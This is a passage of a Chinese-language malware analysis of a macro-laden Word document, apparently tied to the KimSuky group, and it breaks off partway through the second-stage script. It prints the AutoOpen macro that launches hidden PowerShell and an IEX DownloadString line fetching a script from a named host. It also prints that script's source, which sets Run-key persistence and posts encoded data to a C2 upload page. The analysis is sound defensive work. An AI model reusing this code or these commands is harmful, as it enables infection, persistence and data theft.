src="https://s2.loli.net/2022/10/19/JuKSgodrphC6EbD.png" alt="image-20221014202936079.png"></p><p>按alt + f11进入VBA页面，打开宏发现程序被加密，这个加密是伪加密，有两种方法可以绕过密码打开宏代码</p><p>方法一：</p><p>使用二进制编辑工具打开样本，文本搜索”DPB”，改为”DPX”，保存后再次打开VBA页面可以读取代码</p><p>方法二：</p><p>使用oletools里的olevba工具提取宏代码，直接使用命令即可</p><p><img src="https://s2.loli.net/2022/10/19/Kex83uBrY2pESNH.png" alt="image-20221014205029313.png"></p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">olevba <span class="number">0.60</span>.<span class="number">1</span> <span class="keyword">on</span> Python <span class="number">3.8</span>.<span class="number">5</span> - http://decalage.info/python/oletools</span><br><span class="line">===============================================================================</span><br><span class="line"><span class="symbol">FILE:</span> .\<span class="number">1</span>fcd9892532813a27537f4e1a1c21ec0c110d6b3929602750ed77bbba7caa426.doc</span><br><span class="line"><span class="symbol">Type:</span> OpenXML</span><br><span class="line">WARNING  <span class="keyword">For</span> now, VBA stomping cannot be detected <span class="keyword">for</span> files <span class="keyword">in</span> memory</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">VBA MACRO ThisDocument.cls</span><br><span class="line"><span class="keyword">in</span> file: word/vbaProject.bin - OLE stream: <span class="comment">&#x27;VBA/ThisDocument&#x27;</span></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">(empty macro)</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">VBA MACRO tptkddlsjangkspdy.frm</span><br><span class="line"><span class="keyword">in</span> file: word/vbaProject.bin - OLE stream: <span class="comment">&#x27;VBA/tptkddlsjangkspdy&#x27;</span></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">(empty macro)</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">VBA MACRO Module1.bas</span><br><span class="line"><span class="keyword">in</span> file: word/vbaProject.bin - OLE stream: <span class="comment">&#x27;VBA/Module1&#x27;</span></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line"><span class="keyword">Function</span> <span class="keyword">interface</span>()</span><br><span class="line">    TmpEditPath = tptkddlsjangkspdy.Controls(Len(<span class="string">&quot;z&quot;</span>)).Value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span> JsEditContent = tptkddlsjangkspdy.Controls(<span class="number">3</span> - <span class="number">1</span> - <span class="number">1</span> - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    Open Trim(TmpEditPath) <span class="keyword">For</span> Output <span class="keyword">As</span> #<span class="number">2</span></span><br><span class="line"></span><br><span class="line">       Print #<span class="number">2</span>, JsEditContent.<span class="keyword">Text</span></span><br><span class="line">    Close #<span class="number">2</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">    delimage</span><br><span class="line">    <span class="keyword">interface</span></span><br><span class="line">    executeps</span><br><span class="line">    shlet</span><br><span class="line">    regpa</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> executeps()</span><br><span class="line">d1 = <span class="string">&quot;powershell.exe -ExecutionPolicy Bypass -noLogo $s=[System.IO.File]::ReadAllText(&#x27;c:\windows\temp\bobo.txt&#x27;);iex $s&quot;</span></span><br><span class="line">    <span class="keyword">With</span> CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">        .Run d1, Left(Left(<span class="keyword">Mid</span>(<span class="string">&quot;ingfbbamkodhqcwtpzhbcpxqaaigdjmoadch626463965207171466558669015372347853185123047524556333900563576839593172803245215818260&quot;</span>, <span class="number">47</span>), <span class="number">1</span>), <span class="number">1</span>), <span class="literal">False</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> delimage()</span><br><span class="line">  Selection.Delete Unit:=wdCharacter, Count:=<span class="number">1</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> shlet()</span><br><span class="line">    Selection.WholeStory</span><br><span class="line">    <span class="keyword">With</span> Selection.Font</span><br><span class="line">        .NameFarEast = <span class="string">&quot;맑은 고딕&quot;</span></span><br><span class="line">        .NameAscii = <span class="string">&quot;&quot;</span></span><br><span class="line">        .NameOther = <span class="string">&quot;&quot;</span></span><br><span class="line">        .Name = <span class="string">&quot;&quot;</span></span><br><span class="line">        .Hidden = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> regpa()</span><br><span class="line">    <span class="keyword">With</span> Selection.ParagraphFormat</span><br><span class="line">        .LeftIndent = CentimetersToPoints(<span class="number">2</span>)</span><br><span class="line">        .SpaceBeforeAuto = <span class="literal">True</span></span><br><span class="line">        .SpaceAfterAuto = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line">    <span class="keyword">With</span> Selection.ParagraphFormat</span><br><span class="line">        .RightIndent = CentimetersToPoints(<span class="number">2</span>)</span><br><span class="line">        .SpaceBeforeAuto = <span class="literal">True</span></span><br><span class="line">        .SpaceAfterAuto = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line">    Selection.PageSetup.TopMargin = CentimetersToPoints(<span class="number">2.5</span>)</span><br><span class="line">    Selection.PageSetup.BottomMargin = CentimetersToPoints(<span class="number">2.5</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">VBA FORM <span class="type">STRING</span> <span class="keyword">IN</span> <span class="comment">&#x27;word/vbaProject.bin&#x27; - OLE stream: &#x27;tptkddlsjangkspdy/o&#x27;</span></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">IEX (<span class="built_in">New</span>-<span class="type">Object</span> System.Net.WebClient).DownloadString(<span class="comment">&#x27;http://mybobo.mygamesonline.org/flower01/flower01.ps1&#x27;)ex</span></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">VBA FORM <span class="type">STRING</span> <span class="keyword">IN</span> <span class="comment">&#x27;word/vbaProject.bin&#x27; - OLE stream: &#x27;tptkddlsjangkspdy/o&#x27;</span></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line"><span class="symbol">C:</span>\windows\temp\bobo.txt</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">VBA FORM Variable <span class="string">&quot;b&#x27;TextBox1&#x27;&quot;</span> <span class="keyword">IN</span> <span class="comment">&#x27;word/vbaProject.bin&#x27; - OLE stream: &#x27;tptkddlsjangkspdy&#x27;</span></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">b<span class="string">&quot;IEX (New-Object System.Net.WebClient).DownloadString(&#x27;http://mybobo.mygamesonline.org/flower01/flower01.ps1&#x27;)&quot;</span></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">VBA FORM Variable <span class="string">&quot;b&#x27;TextBox2&#x27;&quot;</span> <span class="keyword">IN</span> <span class="comment">&#x27;word/vbaProject.bin&#x27; - OLE stream: &#x27;tptkddlsjangkspdy&#x27;</span></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">b<span class="comment">&#x27;C:\\windows\\temp\\bobo.txt&#x27;</span></span><br><span class="line">+----------+--------------------+---------------------------------------------+</span><br><span class="line">|Type      |Keyword             |Description                                  |</span><br><span class="line">+----------+--------------------+---------------------------------------------+</span><br><span class="line">|AutoExec  |AutoOpen            |Runs <span class="keyword">when</span> the Word document <span class="built_in">is</span> opened        |</span><br><span class="line">|Suspicious|Open                |May open a file                              |</span><br><span class="line">|Suspicious|Output              |May write <span class="keyword">to</span> a file (<span class="keyword">if</span> combined <span class="keyword">with</span> Open)  |</span><br><span class="line">|Suspicious|Print #             |May write <span class="keyword">to</span> a file (<span class="keyword">if</span> combined <span class="keyword">with</span> Open)  |</span><br><span class="line">|Suspicious|Shell               |May run an executable file <span class="built_in">or</span> a system       |</span><br><span class="line">|          |                    |command                                      |</span><br><span class="line">|Suspicious|WScript.Shell       |May run an executable file <span class="built_in">or</span> a system       |</span><br><span class="line">|          |                    |command                                      |</span><br><span class="line">|Suspicious|Run                 |May run an executable file <span class="built_in">or</span> a system       |</span><br><span class="line">|          |                    |command                                      |</span><br><span class="line">|Suspicious|powershell          |May run PowerShell commands                  |</span><br><span class="line">|Suspicious|ExecutionPolicy     |May run PowerShell commands                  |</span><br><span class="line">|Suspicious|CreateObject        |May create an OLE <span class="type">object</span>                     |</span><br><span class="line">|Suspicious|<span class="built_in">New</span>-<span class="type">Object</span>          |May create an OLE <span class="type">object</span> <span class="keyword">using</span> PowerShell    |</span><br><span class="line">|Suspicious|windows             |May enumerate application windows (<span class="keyword">if</span>        |</span><br><span class="line">|          |                    |combined <span class="keyword">with</span> Shell.Application <span class="type">object</span>)      |</span><br><span class="line">|Suspicious|Net.WebClient       |May download files <span class="keyword">from</span> the Internet <span class="keyword">using</span>   |</span><br><span class="line">|          |                    |PowerShell                                   |</span><br><span class="line">|Suspicious|DownloadString      |May download files <span class="keyword">from</span> the Internet <span class="keyword">using</span>   |</span><br><span class="line">|          |                    |PowerShell                                   |</span><br><span class="line">|Suspicious|System              |May run an executable file <span class="built_in">or</span> a system       |</span><br><span class="line">|          |                    |command <span class="keyword">on</span> a Mac (<span class="keyword">if</span> combined <span class="keyword">with</span>           |</span><br><span class="line">|          |                    |libc.dylib)                                  |</span><br><span class="line">|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |</span><br><span class="line">|          |                    |used <span class="keyword">to</span> obfuscate strings (<span class="keyword">option</span> --decode <span class="keyword">to</span>|</span><br><span class="line">|          |                    |see all)                                     |</span><br><span class="line">|IOC       |http://mybobo.mygame|URL                                          |</span><br><span class="line">|          |sonline.org/flower01|                                             |</span><br><span class="line">|          |/flower01.ps1<span class="comment">&#x27;      |                                             |</span></span><br><span class="line">|IOC       |powershell.exe      |Executable file name                         |</span><br><span class="line">|IOC       |flower01.ps1        |Executable file name                         |</span><br><span class="line">+----------+--------------------+---------------------------------------------+</span><br></pre></td></tr></table></figure><p>分析上面的宏代码，程序定义了几个函数，在executeps()中，程序使调用了powershell命令在c:\windows\temp\bobo.txt路径下创建一个文件：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-noLogo</span> <span class="variable">$s</span>=[<span class="type">System.IO.File</span>]::ReadAllText(<span class="string">&#x27;c:\windows\temp\bobo.txt&#x27;</span>);<span class="built_in">iex</span> <span class="variable">$s</span></span><br></pre></td></tr></table></figure><p>为了验证猜想，打开火绒剑检测程序发现的确调用了powershell对文件进行了操作</p><p><img src="https://s2.loli.net/2022/10/19/CXnMZGLfYmIzbR1.png" alt="image-20221014211446606.png"></p><p>找到文件对应的位置打开发现文件中被使用IEX写入了一段代码，代码中存在一个网址，目的访问网址下载对应的文件在当前文件夹</p><p><img src="https://s2.loli.net/2022/10/19/vaK2PyqXd6QpZGs.png" alt="image-20221014211706337.png"></p><p>当我们再去访问连接的时候发现链接已经挂了。貌似就要在这里断了。。。。</p><p>想到可以直接从threatbook找到这个样本的生成文件直接下载下来就可以直接分析了。把flower01.ps1文件下载下来分析代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SERVER_ADDR</span> = <span class="string">&quot;http://mybobo.mygamesonline.org/flower01/&quot;</span></span><br><span class="line"><span class="variable">$UP_URI</span> = <span class="string">&quot;post.php&quot;</span></span><br><span class="line"><span class="variable">$upName</span> = <span class="string">&quot;flower01&quot;</span></span><br><span class="line"><span class="variable">$LocalID</span> = <span class="string">&quot;flower01&quot;</span></span><br><span class="line"><span class="variable">$LOG_FILENAME</span> = <span class="string">&quot;flower01.hwp&quot;</span></span><br><span class="line"><span class="variable">$LOG_FILEPATH</span> = <span class="string">&quot;\flower01\&quot;</span></span><br><span class="line"><span class="string"><span class="subst">$TIME_VALUE</span> = 1000*60*60</span></span><br><span class="line"><span class="string"><span class="subst">$EXE</span> = &quot;</span>rundll32.exe<span class="string">&quot;</span></span><br><span class="line"><span class="string"><span class="subst">$MyfuncName</span> = &quot;</span>Run<span class="string">&quot;</span></span><br><span class="line"><span class="string"><span class="subst">$RegValueName</span> = &quot;</span>Alzipupdate<span class="string">&quot;//设置注册表值</span></span><br><span class="line"><span class="string"><span class="subst">$RegKey</span> = &quot;</span>HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<span class="string">&quot;</span></span><br><span class="line"><span class="string"><span class="subst">$regValue</span> = &quot;</span>cmd.exe /c powershell.exe -windowstyle hidden <span class="title function_ invoke__">IEX</span> (New-Object System.Net.WebClient).<span class="title function_ invoke__">DownloadString</span>(<span class="string">&#x27;http://mybobo.mygamesonline.org/flower01/flower01.ps1&#x27;</span>)<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function decode(<span class="subst">$encstr</span>)//单表加密操作</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"><span class="subst">$key</span> = [byte[]](0,2,4,3,3,6,4,5,7,6,7,0,5,5,4,3,5,4,3,7,0,7,6,2,6,2,4,6,7,2,4,7,5,5,7,0,7,3,3,3,7,3,3,1,4,2,3,7,0,2,7,7,3,5,1,0,1,4,0,5,0,0,0,0,7,5,1,4,5,4,2,0,6,1,4,7,5,0,1,0,3,0,3,1,3,5,1,2,5,0,1,7,1,4,6,0,2,3,3,4,2,5,2,5,4,5,7,3,1,0,1,6,4,1,1,2,1,4,1,5,4,2,7,4,5,1,6,4,6,3,6,4,5,0,3,6,4,0,1,6,3,3,5,7,0,5,7,7,2,5,2,7,7,4,7,5,5,0,5,6) </span></span><br><span class="line"><span class="string"><span class="subst">$len</span> = <span class="subst">$encstr</span>.Length</span></span><br><span class="line"><span class="string"><span class="subst">$j</span> = 0</span></span><br><span class="line"><span class="string"><span class="subst">$i</span> = 0</span></span><br><span class="line"><span class="string"><span class="subst">$comletter</span> = &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">while(<span class="subst">$i</span> -lt <span class="subst">$len</span>)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"><span class="subst">$j</span> = <span class="subst">$j</span> % 160</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">$asciidec</span> = <span class="subst">$encstr</span>[<span class="subst">$i</span>] -bxor <span class="subst">$key</span>[<span class="subst">$j</span>]</span></span><br><span class="line"><span class="string"><span class="subst">$dec</span> = [char]<span class="subst">$asciidec</span></span></span><br><span class="line"><span class="string"><span class="subst">$comletter</span> += <span class="subst">$dec</span></span></span><br><span class="line"><span class="string"><span class="subst">$j</span>++</span></span><br><span class="line"><span class="string"><span class="subst">$i</span>++</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">return <span class="subst">$comletter</span></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">function UpLoadFunc(<span class="subst">$logpath</span>)//上传函数</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"><span class="subst">$Url</span> = <span class="subst">$SERVER_ADDR</span> + <span class="subst">$UP_URI</span>//拼接成http://mybobo.mygamesonline.org/flower01/post.php</span></span><br><span class="line"><span class="string"><span class="subst">$bReturn</span> = <span class="subst">$True</span></span></span><br><span class="line"><span class="string"><span class="subst">$testpath</span> = Test-Path <span class="subst">$logpath</span></span></span><br><span class="line"><span class="string">if(<span class="subst">$testpath</span> -eq <span class="subst">$False</span>)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">return <span class="subst">$bReturn</span></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$hexdata</span> = [IO.File]::ReadAllText(<span class="subst">$logpath</span>)//读取路径文件中的数据</span></span><br><span class="line"><span class="string"><span class="subst">$encletter</span> = decode <span class="subst">$hexdata</span></span></span><br><span class="line"><span class="string"><span class="subst">$nEncLen</span> = <span class="subst">$encletter</span>.Length</span></span><br><span class="line"><span class="string"><span class="subst">$LF</span> = &quot;</span>`r`n<span class="string">&quot;</span></span><br><span class="line"><span class="string"><span class="subst">$templen</span> = 0x100000//限制最大长度</span></span><br><span class="line"><span class="string"><span class="subst">$sum</span> = 0</span></span><br><span class="line"><span class="string">do//构造和发送POST请求</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"><span class="subst">$szOptional</span> = &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"><span class="subst">$pUploadData</span> = &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">Start-Sleep -Milliseconds 100//设置时间</span></span><br><span class="line"><span class="string"><span class="subst">$readlen</span> = <span class="subst">$templen</span>;</span></span><br><span class="line"><span class="string">if ((<span class="subst">$nEncLen</span> - <span class="subst">$sum</span>) -lt <span class="subst">$templen</span>)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"><span class="subst">$readlen</span> = <span class="subst">$nEncLen</span> - <span class="subst">$sum</span></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if (<span class="subst">$readlen</span> -ne 0)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"><span class="subst">$pUploadData</span> = <span class="subst">$encletter</span> + <span class="subst">$sum</span></span></span><br><span class="line"><span class="string"><span class="subst">$sum</span> += <span class="subst">$readlen</span></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"><span class="subst">$pUploadData</span> += &quot;</span>ending<span class="string">&quot;</span></span><br><span class="line"><span class="string"><span class="subst">$sum</span> += 9</span></span><br><span class="line"><span class="string"><span class="subst">$readlen</span> = 6</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">Start-Sleep -Milliseconds 1</span></span><br><span class="line"><span class="string"><span class="subst">$boundary</span> = &quot;</span>----WebKitFormBoundarywhpFxMBe19cSjFnG<span class="string">&quot;//KimSuky常用的协议</span></span><br><span class="line"><span class="string"><span class="subst">$ContentType</span> = &#x27;multipart/form-data; boundary=&#x27; + <span class="subst">$boundary</span></span></span><br><span class="line"><span class="string"><span class="subst">$bodyLines</span> = (</span></span><br><span class="line"><span class="string">&quot;</span>--<span class="variable">$boundary</span><span class="string">&quot;,</span></span><br><span class="line"><span class="string">&quot;</span>Content-Disposition: form-data; name=`<span class="string">&quot;MAX_FILE_SIZE`&quot;</span><span class="variable">$LF</span><span class="string">&quot;,</span></span><br><span class="line"><span class="string">&quot;</span><span class="number">10000000</span><span class="string">&quot;,</span></span><br><span class="line"><span class="string">&quot;</span>--<span class="variable">$boundary</span><span class="string">&quot;,</span></span><br><span class="line"><span class="string">&quot;</span>Content-Disposition: form-data; name=`<span class="string">&quot;userfile`&quot;</span>; filename=`<span class="string">&quot;<span class="subst">$upName</span>`&quot;</span><span class="string">&quot;,</span></span><br><span class="line"><span class="string">&quot;</span>Content-Type: application/octet-stream<span class="variable">$LF</span><span class="string">&quot;,</span></span><br><span class="line"><span class="string"><span class="subst">$pUploadData</span>,</span></span><br><span class="line"><span class="string">&quot;</span>--<span class="variable">$boundary</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">) -join <span class="subst">$LF</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Start-Sleep -Milliseconds 1</span></span><br><span class="line"><span class="string"><span class="subst">$psVersion</span> = <span class="subst">$PSVersionTable</span>.PSVersion</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">$r</span> = [System.Net.WebRequest]::Create(<span class="subst">$Url</span>)//创建POST 请求C2：http://mybobo.mygamesonline.org/flower01/post.php</span></span><br><span class="line"><span class="string"><span class="subst">$r</span>.Method = &quot;</span>POST<span class="string">&quot;</span></span><br><span class="line"><span class="string"><span class="subst">$r</span>.UseDefaultCredentials = <span class="subst">$true</span></span></span><br><span class="line"><span class="string"><span class="subst">$r</span>.ContentType = <span class="subst">$ContentType</span></span></span><br><span class="line"><span class="string"><span class="subst">$enc</span> = [system.Text.Encoding]::UTF8</span></span><br><span class="line"><span class="string"><span class="subst">$data1</span> = <span class="subst">$enc</span>.GetBytes(<span class="subst">$bodyLines</span>)</span></span><br><span class="line"><span class="string"><span class="subst">$r</span>.ContentLength = <span class="subst">$data1</span>.Length</span></span><br><span class="line"><span class="string"><span class="subst">$newStream</span> = <span class="subst">$r</span>.GetRequestStream()</span></span><br><span class="line"><span class="string"><span class="subst">$newStream</span>.Write(<span class="subst">$data1</span>, 0, <span class="subst">$data1</span>.Length)</span></span><br><span class="line"><span class="string"><span class="subst">$newStream</span>.Close();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(<span class="subst">$php_post</span> -like &quot;</span>ok<span class="string">&quot;)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo &quot;</span>UpLoad Success!!!<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo &quot;</span>UpLoad Fail!!!<span class="string">&quot;</span></span><br><span class="line"><span class="string"><span class="subst">$bReturn</span> = <span class="subst">$False</span></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125; while (<span class="subst">$sum</span> -le <span class="subst">$nEncLen</span>);</span></span><br><span class="line"><span class="string">return <span class="subst">$bReturn</span></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">function FileUploading(<span class="subst">$upPathName</span>)//调用UpLoadFunc函数进行上传</span></span><br><span 